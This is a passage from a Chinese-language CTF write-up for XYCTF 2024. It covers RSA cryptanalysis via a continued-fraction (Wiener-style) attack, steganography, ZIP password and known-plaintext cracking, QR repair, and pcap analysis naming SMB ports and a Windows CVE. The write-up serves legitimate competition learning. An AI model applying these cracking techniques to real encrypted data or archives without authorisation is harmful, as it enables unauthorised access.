class="comment">#172005065945326769176157335849432320425605083524943730546805772515111751580759726759492349719668775270727323745284785341119685198468883978645793770975366048506237371435027612758232099414404389043740306443065413069994232238075194102578269859784981454218948784071599231415554297361219709787507633404217550013282713899284609273532223781487419770338416653260109238572639243087280632577902857385265070736208291583497988891353312351322545840742380550393294960815728021248513046077985900158814037534487146730483099151396746751774427787635287611736111679074330407715700153025952858666841328055071403960165321273972935204988906850585454805923440635864200149694398767776539993952528995717480620593326867245714074205285828967234591508039849777840636255379730281105670496110061909219669860172557450779495125345533232776767292561378244884362014224844319802810586344516400297830227894063759083198761120293919537342405893653545157892446163</span></span><br><span class="line"><span class="comment">#99075185389443078008327214328328747792385153883836599753096971412377366865826254033534293886034828804219037466246175526347014045811852531994537520303063113985486063022444972761276531422538694915030159420989401280012025249129111871649831185047820236417385693285461420040134313833571949090757635806658958193793</span></span><br></pre></td></tr></table></figure>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>的近似值为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>n</mi><mn>3</mn></msup></mrow><annotation encoding="application/x-tex">n^3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span><br />
套安恒书上的一个脚本</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">e=</span><br><span class="line">n=</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ContinuedFraction</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, numerator, denumerator</span>):</span><br><span class="line">        self.numberlist = []</span><br><span class="line">        self.fractionlist = []</span><br><span class="line">        self.GenerateNumberList(numerator, denumerator)</span><br><span class="line">        self.GenerateFractionList()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GenerateNumberList</span>(<span class="params">self, numerator, denumerator</span>):</span><br><span class="line">        <span class="keyword">while</span> numerator != <span class="number">1</span>:</span><br><span class="line">            quotient = numerator//denumerator</span><br><span class="line">            remainder = numerator % denumerator</span><br><span class="line">            self.numberlist.append(quotient)</span><br><span class="line">            numerator = denumerator</span><br><span class="line">            denumerator = remainder</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GenerateFractionList</span>(<span class="params">self</span>):</span><br><span class="line">        self.fractionlist.append([self.numberlist[<span class="number">0</span>], <span class="number">1</span>])</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(self.numberlist)):</span><br><span class="line">            numerator = self.numberlist[i]</span><br><span class="line">            denumerator = <span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">                temp = numerator</span><br><span class="line">                numerator = denumerator+numerator*self.numberlist[i-j-<span class="number">1</span>]</span><br><span class="line">                denumerator = temp</span><br><span class="line">            self.fractionlist.append([numerator, denumerator])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = ContinuedFraction(e, n**<span class="number">3</span>)</span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> k, d <span class="keyword">in</span> a.fractionlist:</span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">0</span>: </span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> (e * d - <span class="number">1</span>) % k != <span class="number">0</span>:  </span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    phi = (e * d - <span class="number">1</span>) // k  </span><br><span class="line">    result.append(phi)</span><br><span class="line">x = Symbol(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> phi <span class="keyword">in</span> result:</span><br><span class="line">    f = n**<span class="number">3</span>-x**<span class="number">3</span>+<span class="number">3</span>*n*x-phi+<span class="number">1</span></span><br><span class="line">    flag = solve(f, x)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;XYCTF&#123;&quot;</span> + hashlib.md5(<span class="built_in">str</span>(flag).encode()).hexdigest() + <span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="crypto-factor3"><a class="markdownIt-Anchor" href="#crypto-factor3"></a> Crypto factor3</h2>
<p>维纳攻击，连分数分解，跟上面一样，只是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>的近似值换成了<code>pow(n+1,2)</code>，或者<code>pow(n,2)</code>，都能把<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>找到<br />
<code>c=d**2^m</code>，<code>m=c^(d**2)</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> phi <span class="keyword">in</span> result:</span><br><span class="line">    d = inverse(e, phi)</span><br><span class="line">    flag = long_to_bytes(c ^ (d**<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;XYCTF&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;XYCTF&#123;I_love_to_read_the_crypto_paper_and_try_to_ak_them&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>看到这个flag的时候确实翻了看了不少paper，但都没能找到正确的攻击方法，但通过这两题，我好像发现了窍门，就是找到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>的近似值(与n相关)就可以了，这种方法应该是对p和q有限制的，但题目是肯定满足条件的</p>
<h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1>
<h2 id="misc-签到"><a class="markdownIt-Anchor" href="#misc-签到"></a> Misc 签到</h2>
<p>公众号题，跳过</p>
<h2 id="misc-真签到"><a class="markdownIt-Anchor" href="#misc-真签到"></a> Misc 真&gt;签到</h2>
<p>010无需多言<br />
XYCTF{59bd0e77d13c_1406b23219e_f91cf3a_153e8ea4_77508ba}</p>
<h2 id="misc-ez_隐写"><a class="markdownIt-Anchor" href="#misc-ez_隐写"></a> Misc ez_隐写</h2>
<p>爆破没有用，binwalk看看，提示图片损坏，压缩软件和虚拟机都提示crc值错误，说明宽高必然不对<br />
010一看，高太大了，改成高等宽试试，保存发现图片可以查看了，右下角提示，XYCTF开赛时间，这不20240401嘛<br />
结果输进去死活都不对，队友可以，结果一试，我只有在7zip里面才可以打开<br />
附一张水印图<br />
<img src="https://picx.zhimg.com/80/v2-2eacfd2ac4d59f4701d51b2682fe3856_1440w.jpeg" alt="" /><br />
然后就是盲水印提取了，可以拿工具，也可以上脚本，貌似工具不怎么清晰，emm<br />
大佬的一个matlab脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">imageA=imread(&#x27;water.jpg&#x27;,&#x27;jpg&#x27;);</span><br><span class="line">fftA=fft2(imageA);</span><br><span class="line">imshow(fftshift(fftA));</span><br><span class="line">imshow(fft(rgb2gray(imread(dec_water.jpg))),[1,2]);</span><br></pre></td></tr></table></figure>
<h2 id="misc-zzl的护理小课堂"><a class="markdownIt-Anchor" href="#misc-zzl的护理小课堂"></a> Misc zzl的护理小课堂</h2>
<p>看源代码的话没什么用，把源代码这一段放控制台跑了就行</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> flagXhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>(); </span><br><span class="line">                        flagXhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;flag.php&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">                        flagXhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (flagXhr.<span class="property">readyState</span> === <span class="number">4</span> &amp;&amp; flagXhr.<span class="property">status</span> === <span class="number">200</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> flag = flagXhr.<span class="property">responseText</span>;</span><br><span class="line">                                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;scoreDisplay&#x27;</span>).<span class="property">innerText</span> = <span class="string">&quot;Flag: &quot;</span> + flag;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;;</span><br><span class="line">                        flagXhr.<span class="title function_">send</span>();</span><br></pre></td></tr></table></figure>
<p><code>XYCTF&#123;Z21_7elL_YOu_79aaa6f2b520&#125;</code></p>
<p>哟嚯，看见官方wp考点是<code>js断点</code>，好吧，有的wp是抓包，然后再访问<code>flag.php</code>的</p>
<h2 id="misc-彩蛋"><a class="markdownIt-Anchor" href="#misc-彩蛋"></a> Misc 彩蛋？</h2>
<p><img src="https://picx.zhimg.com/80/v2-f0fd573d20fc6750fee217ab6f521b3e_1440w.png" alt="" /><br />
发现两个彩蛋，八进制转码得到<code>XYCTF&#123;this_a_</code>，二进制解码得到<code>find_it&#125;</code>，要注意的是这里7位一组<br />
海报webp格式转png，lsb隐写，rgb000<br />
<a target="_blank" rel="noopener" href="https://cdkm.com/cn/webp-to-png#google_vignette">https://cdkm.com/cn/webp-to-png#google_vignette</a><br />
键盘密码，除了常见的QWERTY，还有dvorak<br />
xn0jtxgoy.p{urp{lbi{abe{c{ydcbt{frb{jab{<br />
<a target="_blank" rel="noopener" href="http://wbic16.xedoloh.com/dvorak.html">http://wbic16.xedoloh.com/dvorak.html</a><br />
随波逐流也可以，但是要知道是dvorak解密<br />
<code>XYCTF&#123;this_a_bl0ckbuster_for_png_and_i_think_yon_can_find_it&#125;</code></p>
<p>赛后发现原来lsb隐写可以不手动？<br />
<code>kali: zsteg -a aa.png </code><br />
好东西啊</p>
<h2 id="misc-熊博士"><a class="markdownIt-Anchor" href="#misc-熊博士"></a> Misc 熊博士</h2>
<p><code>CBXGU&#123;ORF_BV_NVR_BLF_CRZL_QQ&#125;</code><br />
把<code>CBXGUORFBVNVRBLFCRZLQQ</code>放入随波逐流<br />
得到<code>Atbash解码:xyctfliuyemeiyouxiaojj</code><br />
再根据提示<br />
<code>XYCTF&#123;liu_ye_mei_you_xiao_jj&#125;</code></p>
<h2 id="misc-game"><a class="markdownIt-Anchor" href="#misc-game"></a> Misc game</h2>
<p>百度识图就是lj，前几天梯子订阅出了点问题，今天好了，谷歌识图一把出<br />
<code>XYCTF&#123;Papers Please&#125;</code><br />
(本人不玩Steam)</p>
<h2 id="misc-zip神之套"><a class="markdownIt-Anchor" href="#misc-zip神之套"></a> Misc ZIP神之套</h2>
<p>把exe文件拖入小黑窗，得到<code>xyctf????????ftcyx</code><br />
用ARCHPR，进行掩码攻击，得到密码<code>xyctf20240401ftcyx</code><br />
再用ARCHPR进行已知明文攻击，保存已解密的压缩包<br />
然后在flag.md中发现flag，<code>XYCTF&#123;1A4B8-C9D2F3E-6A4B8C-9D2F3E7F&#125;</code></p>
<h2 id="misc-tpcl"><a class="markdownIt-Anchor" href="#misc-tpcl"></a> Misc TPCL</h2>
<p>搬出我pwn爹的blog<br />
<a target="_blank" rel="noopener" href="https://qanux.github.io/2023/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BD%BF%E7%94%A8gdb%E6%9D%A5%E8%B0%83%E8%AF%95%E5%BC%82%E6%9E%84%E7%A8%8B%E5%BA%8F/">https://qanux.github.io/2023/11/16/记一次使用gdb来调试异构程序/</a><br />
用qemu-user执行文件<br />
<img src="https://picx.zhimg.com/80/v2-9b1f56a80a41e4c67696bad75ea630df_1440w.png" alt="" /><br />
1-&gt;0，得到<code>FLAG&#123;PLCT_An4_r0SCv_x0huann0&#125;</code></p>
<h2 id="misc-网络追踪"><a class="markdownIt-Anchor" href="#misc-网络追踪"></a> Misc 网络追踪</h2>
<p>往最后拉<br />
<img src="https://pic1.zhimg.com/80/v2-66000ac19d0359dcc05eb4fe6edb1865_1440w.png" alt="" /></p>
<p>很明显，中间红色的一大片应该就是主机(靶机)，<code>192.168.204.133</code><br />
查看开放端口，过滤出TCP SYN和ACK标志位为1的所有流量包，选择主机产生的流量，<code>tcp.flags.syn ==1 &amp;&amp; tcp.flags.ack ==1 &amp;&amp; ip.src==192.168.204.133</code><br />
很明显得到，<code>445 139 135</code><br />
445端口产生的流量最多，<code>SMB</code>流量为主<br />
<code>Windows SMB</code>远程代码执行漏洞<br />
<a target="_blank" rel="noopener" href="https://www.cnblogs.com/rookieDanny/p/13037862.html">https://www.cnblogs.com/rookieDanny/p/13037862.html</a><br />
这试出来的<code>CVE-2008-4250</code>？<br />
<code>XYCTF&#123;192.168.204.133_445_139_135_CVE-2008-4250&#125;</code></p>
<h2 id="misc-我的二维码为啥扫不出来"><a class="markdownIt-Anchor" href="#misc-我的二维码为啥扫不出来"></a> Misc 我的二维码为啥扫不出来？</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_color</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> x == <span class="number">255</span> <span class="keyword">else</span> <span class="number">255</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_row_colors</span>(<span class="params">pixels, row, width, block_size=<span class="number">10</span></span>):</span><br><span class="line">    <span class="keyword">for</span> x_block <span class="keyword">in</span> <span class="built_in">range</span>(width // block_size):</span><br><span class="line">        x = x_block * block_size</span><br><span class="line">        y = row * block_size</span><br><span class="line">        <span class="keyword">for</span> x_small <span class="keyword">in</span> <span class="built_in">range</span>(x, x + block_size):</span><br><span class="line">            <span class="keyword">for</span> y_small <span class="keyword">in</span> <span class="built_in">range</span>(y, y + block_size):</span><br><span class="line">                pixel = pixels[x_small, y_small]</span><br><span class="line">                pixels[x_small, y_small] = reverse_color(pixel)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_col_colors</span>(<span class="params">pixels, col, height, block_size=<span class="number">10</span></span>):</span><br><span class="line">    <span class="keyword">for</span> y_block <span class="keyword">in</span> <span class="built_in">range</span>(height // block_size):</span><br><span class="line">        x = col * block_size</span><br><span class="line">        y = y_block * block_size</span><br><span class="line">        <span class="keyword">for</span> x_small <span class="keyword">in</span> <span class="built_in">range</span>(x, x + block_size):</span><br><span class="line">            <span class="keyword">for</span> y_small <span class="keyword">in</span> <span class="built_in">range</span>(y, y + block_size):</span><br><span class="line">                pixel = pixels[x_small, y_small]</span><br><span class="line">                pixels[x_small, y_small] = reverse_color(pixel)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">original_img = Image.<span class="built_in">open</span>(<span class="string">&quot;flag.png&quot;</span>)</span><br><span class="line"></span><br><span class="line">new_img = original_img.copy()</span><br><span class="line"></span><br><span class="line">width, height = new_img.size</span><br><span class="line">pixels = new_img.load()</span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> count &lt; <span class="number">7</span>:</span><br><span class="line">    x = random.randint(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        reverse_col_colors(pixels, random.randint(<span class="number">0</span>, height // <span class="number">10</span> - <span class="number">1</span>), height)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        reverse_row_colors(pixels, random.randint(<span class="number">0</span>, width // <span class="number">10</span> - <span class="number">1</span>), width)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">new_img.save(<span class="string">&quot;new.png&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>从行和列中选取7个进行颜色反转，丁真法可以修复四次，得到三个定位符</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">reverse_row_colors(pixels, <span class="number">1</span>, height)</span><br><span class="line">reverse_col_colors(pixels, <span class="number">5</span>, width)</span><br><span class="line">reverse_col_colors(pixels, <span class="number">2</span>, width)</span><br><span class="line">reverse_col_colors(pixels, <span class="number">0</span>, width)</span><br></pre></td></tr></table></figure>
<p>还需爆破三次，直接拿原脚本开干</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line">original_img = Image.<span class="built_in">open</span>(<span class="string">&quot;new.png&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    new_img = original_img.copy()</span><br><span class="line">    width, height = new_img.size</span><br><span class="line">    pixels = new_img.load()</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> count &lt; <span class="number">3</span>:</span><br><span class="line">        x = random.randint(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">            reverse_col_colors(pixels, random.randint(</span><br><span class="line">                <span class="number">0</span>, height // <span class="number">10</span> - <span class="number">1</span>), height)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            reverse_row_colors(pixels, random.randint(</span><br><span class="line">                <span class="number">0</span>, width // <span class="number">10</span> - <span class="number">1</span>), width)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    flag = decode(new_img)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(flag):</span><br><span class="line">        new_img.save(<span class="string">&quot;new1.png&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>可以参考一下<br />
<a target="_blank" rel="noopener" href="https://jht3qaq.github.io/2024/04/26/XYCTF2024-Writeup/">https://jht3qaq.github.io/2024/04/26/XYCTF2024-Writeup/</a></p>
<h2 id="misc-ez_base10242"><a class="markdownIt-Anchor" href="#misc-ez_base10242"></a> Misc EZ_Base1024*2</h2>
<p>base2048<br />
<code>מಥൎࢺଳɫअΥٻଯԢڥիɺ୦ࢸЭਘמۊիɎඥࡆڣߣಷܤҾয౽5</code><br />
这不直接梭哈？直接搜base2048可能找不到，但是搜素引擎有推荐的(手动狗头)，后面跟着decoder或者online都找得到，又或者某个密码工具箱，我赛后是有看见可以直接梭哈的<br />
<a target="_blank" rel="noopener" href="https://nerdmosis.com/tools/encode-and-decode-base2048">https://nerdmosis.com/tools/encode-and-decode-base2048</a><br />
<code>XYCTF&#123;84ca3a6e-3508-4e34-a5e0-7d0f03084181&#125;</code></p>
<h2 id="misc-出题有点烦"><a class="markdownIt-Anchor" href="#misc-出题有点烦"></a> Misc 出题有点烦</h2>
<p>爆破，压缩包密码<code>123456</code>，binwalk(图片5)，再爆破，压缩包密码<code>xyctf</code><br />
<code>真的flag：XYCTF&#123;981e5_f3ca30_c841487_830f84_fb433e&#125;</code></p>
<h2 id="misc-美妙的歌声"><a class="markdownIt-Anchor" href="#misc-美妙的歌声"></a> Misc 美妙的歌声</h2>
<p>Audacity频谱图-&gt;<code>XYCTF_1s_w3ll</code>，不是flag，那就是密码吧，DeepSound-&gt;<code>XYCTF&#123;T0uch_y0ur_he3rt_d55ply!!&#125;</code></p>
<h2 id="misc-又是个签到"><a class="markdownIt-Anchor" href="#misc-又是个签到"></a> Misc 又是个签到</h2>
<p><strong>asrmorfe.txt，emoji解一下</strong><br />
<a target="_blank" rel="noopener" href="https://www.emojiall.com/en/text-translator-page">https://www.emojiall.com/en/text-translator-page</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A bunch of tired, anxious sweats rushing down evil monkeys and screaming fear. </span><br><span class="line">In the dark and in dark, medical mask of ogre princess, evil lips clap their hands skulls. </span><br><span class="line">The girl&#x27;s couch was softly tearing, slightly frowned scream, scared screamer&#x27;s shirt and footprints, staff member wearing bikini clothes, man no rolling eyes, old woman opening her hands. </span><br><span class="line">An open-hand baby bra in pairs of slippers, covering the cat&#x27;s tears family with medical mask costumes. </span><br><span class="line">The one with the shirt his face and headscarf eyes closed whispers. </span><br></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一堆疲惫、焦虑的汗水冲下邪恶的猴子，尖叫着恐惧。</span><br><span class="line">在黑暗和黑暗中，食人魔公主的医用面具，邪恶的嘴唇拍手骷髅头。</span><br><span class="line">女孩的沙发轻轻地撕扯着，微微皱着眉头尖叫，吓坏了尖叫者的衬衫和脚印，工作人员穿着比基尼衣服，男人没有翻白眼，老太太张开双手。</span><br><span class="line">一双拖鞋的开放式婴儿胸罩，用医用口罩服装覆盖猫的眼泪家庭。</span><br><span class="line">那个穿着衬衫的人，他的脸和头巾，闭着眼睛，低声说。</span><br></pre></td></tr></table></figure>
<p><strong>签到.txt</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HWXj+kI2pS+5pSJhDS0oAzlQmziosSr7gUvdXppjSt8BNUTz8oLfE57NkCrVwBBgGul5hHzCcKqyG7U5LWMOXYtzloMsVvdZdPbMZyb+EgYF17+W/S1oLDgQcjGmP6CSHWXj+kI2pS+5pSJhDS0oA3fVDcJt/sEYpz9U0yQTrgxTN0kF5G4xTJ5IKqYil2gK3Ml6usGZsucJXa6pCovoeaGSyZNq6T3aX1NOlb5Gt4gF17+W/S1oLDgQcjGmP6CSHWXj+kI2pS+5pSJhDS0oAzlQmziosSr7gUvdXppjSt8PPIU/UwIkvINgvGw+oQMCCaOmO7bDsiSxD/r9w3RKRQEfMm/fv+a/5v/NWgauEpoF17+W/S1oLDgQcjGmP6CSHWXj+kI2pS+5pSJhDS0oA2QV+Gu05V1J2eVrbGhHB487Ns8HTVNYrll8P/Xve17NCaOmO7bDsiSxD/r9w3RKRQEfMm/fv+a/5v/NWgauEpoF17+W/S1oLDgQcjGmP6CS1yISnL45ZHzPjs5BGSboyDJXscweSL6g0ptOqql5vhY7Ns8HTVNYrll8P/Xve17NlyvQj9HulYK3sIMIiNTVrv/QYgLgLF9uO3y6uH800Gy0VvmX5a5S5ZEDlkBSgVrDb/KxZEoU9d83Nbzm7yH80p9xX+50C/29uVc+H6gx1gOTPv9mT6A8qfJoby4BoCS3by65j7WFf6d/XZX0KskX4t1SAjnDpnC8qWVbU6l6Zs9zWhqP0E6UVZEUMUcRZB43hzoYB6fvcRSs8WPoArwl6dY0JrIccPz30xmtzuOLZRKpeJ5IPHFZw5l6Zo68xW/fiYggRz/KqtgFCLvPQ+Lj+6YY1X0zgl8a3xzz5EI9efUoZd30RstP6oPDy17QzTwoaA1OLHZfyIntyJiT9r3x0kLELrvwIFczyH339IGVYqE4qA/Xsd3t/I+jStXiGGCnKCWoqABdtqk7Z22cIzn0lPAiqi9i3hd/IIgrlkygiofpTmBc34UjLRWWFjQgmDQZ8em1hDlVfgd+/93D4BVIn36xgcg2RtYCx2GmXmg5JwRj5pxcBzyOVie5m0U4zHD6Rt0T8GAvCiCf9hhYkBi7lVHe4Sb7op9fpgfXrNunluSOwxS0NlaBKwa1gvE6/BNy2CI2Uv2y4jlPTdIuCNnWbCJsTSczfPJg5PVfyXykQtg4qA/Xsd3t/I+jStXiGGCnKCWoqABdtqk7Z22cIzn0lLw/priteJqeyg6psALOE5HEboNbEbOkupEDq1HXrfGn2CI2Uv2y4jlPTdIuCNnWbCJsTSczfPJg5PVfyXykQtg4qA/Xsd3t/I+jStXiGGCnctoLlIFVYoOgnQM/2Rz5g4eIxaKQoZ+9cRB51n5yxl/BJQA5860fCnVVFSyvS40JdaogrK4AcB+C0gsnUbXVyeX1Kq+MwIHo812Z/0GIAiR+HkJQwgmO7qkogz1vcP4+q7EHUnfXquRurKvZ5jMHz4eIxaKQoZ+9cRB51n5yxl9g/v4Djdoq+YadpY2vIGrZ2CI2Uv2y4jlPTdIuCNnWbDVfnXQwmbz3jY+JyZm4sKgHDLAxJSG/IIAKk2q5C0f6l6L6v86Nra6TiDC3FBOzBEMzapQz6v9XkJfLFhywMtFLbz4PXsEvXiaFbSooHN8xVDDfRmWQyINRSNJguwiY9ElfGZnb6gHT2U5ENwxhxpxW+5Jnwn3zMCBub7HDwqyOSl5l8hKoU5obcdof5SuB3A==</span><br></pre></td></tr></table></figure>
<p>没思路了<br />
官方wp也不见有这题，6</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;HWXj+kI2pS+5pSJhDS0oAzlQmziosSr7gUvdXppjSt8BNUTz8oLfE57NkCrVwBBgGul5hHzCcKqyG7U5LWMOXYtzloMsVvdZdPbMZyb+EgYF17+W/S1oLDgQcjGmP6CSHWXj+kI2pS+5pSJhDS0oA3fVDcJt/sEYpz9U0yQTrgxTN0kF5G4xTJ5IKqYil2gK3Ml6usGZsucJXa6pCovoeaGSyZNq6T3aX1NOlb5Gt4gF17+W/S1oLDgQcjGmP6CSHWXj+kI2pS+5pSJhDS0oAzlQmziosSr7gUvdXppjSt8PPIU/UwIkvINgvGw+oQMCCaOmO7bDsiSxD/r9w3RKRQEfMm/fv+a/5v/NWgauEpoF17+W/S1oLDgQcjGmP6CSHWXj+kI2pS+5pSJhDS0oA2QV+Gu05V1J2eVrbGhHB487Ns8HTVNYrll8P/Xve17NCaOmO7bDsiSxD/r9w3RKRQEfMm/fv+a/5v/NWgauEpoF17+W/S1oLDgQcjGmP6CS1yISnL45ZHzPjs5BGSboyDJXscweSL6g0ptOqql5vhY7Ns8HTVNYrll8P/Xve17NlyvQj9HulYK3sIMIiNTVrv/QYgLgLF9uO3y6uH800Gy0VvmX5a5S5ZEDlkBSgVrDb/KxZEoU9d83Nbzm7yH80p9xX+50C/29uVc+H6gx1gOTPv9mT6A8qfJoby4BoCS3by65j7WFf6d/XZX0KskX4t1SAjnDpnC8qWVbU6l6Zs9zWhqP0E6UVZEUMUcRZB43hzoYB6fvcRSs8WPoArwl6dY0JrIccPz30xmtzuOLZRKpeJ5IPHFZw5l6Zo68xW/fiYggRz/KqtgFCLvPQ+Lj+6YY1X0zgl8a3xzz5EI9efUoZd30RstP6oPDy17QzTwoaA1OLHZfyIntyJiT9r3x0kLELrvwIFczyH339IGVYqE4qA/Xsd3t/I+jStXiGGCnKCWoqABdtqk7Z22cIzn0lPAiqi9i3hd/IIgrlkygiofpTmBc34UjLRWWFjQgmDQZ8em1hDlVfgd+/93D4BVIn36xgcg2RtYCx2GmXmg5JwRj5pxcBzyOVie5m0U4zHD6Rt0T8GAvCiCf9hhYkBi7lVHe4Sb7op9fpgfXrNunluSOwxS0NlaBKwa1gvE6/BNy2CI2Uv2y4jlPTdIuCNnWbCJsTSczfPJg5PVfyXykQtg4qA/Xsd3t/I+jStXiGGCnKCWoqABdtqk7Z22cIzn0lLw/priteJqeyg6psALOE5HEboNbEbOkupEDq1HXrfGn2CI2Uv2y4jlPTdIuCNnWbCJsTSczfPJg5PVfyXykQtg4qA/Xsd3t/I+jStXiGGCnctoLlIFVYoOgnQM/2Rz5g4eIxaKQoZ+9cRB51n5yxl/BJQA5860fCnVVFSyvS40JdaogrK4AcB+C0gsnUbXVyeX1Kq+MwIHo812Z/